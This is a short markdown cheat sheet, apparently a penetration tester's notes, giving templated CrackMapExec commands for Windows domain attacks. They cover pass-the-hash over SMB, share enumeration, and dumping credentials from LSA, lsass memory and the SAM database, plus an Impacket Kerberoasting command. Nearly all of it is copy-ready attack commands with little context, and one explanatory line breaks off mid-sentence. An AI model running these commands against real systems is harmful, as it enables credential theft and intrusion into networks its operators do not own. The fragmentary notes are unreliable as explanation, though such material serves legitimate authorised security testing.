Needs NTLMv1 to pass a hash around

## CrackMapExec

```cme-smb-pass
crackmapexec smb <ip/CIDR> -u <user> -d <domain> -p <pass>
```

```cme-smb-hash
crackmapexec smb <ip/CIDR> -u <user> -d <domain> -H <hash> --local-auth
```

```cme-smb-hash-enum-shares
crackmapexec smb <ip/CIDR> -u <user> -d <domain> -H <hash> --local-auth --shares
```

```cme-smb-hash-lsa-dump
crackmapexec smb <ip/CIDR> -u <user> -d <domain> -H <hash> --local-auth --lsa
```

```cme-smb-hash-lsas-dump-lsassy
crackmapexec smb <ip/CIDR> -u <user> -d <domain> -H <hash> --local-auth -M lsassy
```

```cme-smb-hash-sam-dump
crackmapexec smb <ip/CIDR> -u <user> -d <domain> -H <hash> --local-auth --sam
```

```cme-db
cmedb
```

## CME Modules

```cme-smb-modules
crackmapexec smb -L
```

## SAM Hashes

Important hashes to uuse for things like pass the hash, can be found by lsa and sam dumps by cme

## Kerberoasting

Uses service accounts, gets TGS signed by

```get-TGS
sudo GetUserSPNs.py <DOMAIN>/<User> -dc-ip <DomainControllerIP> -request
```


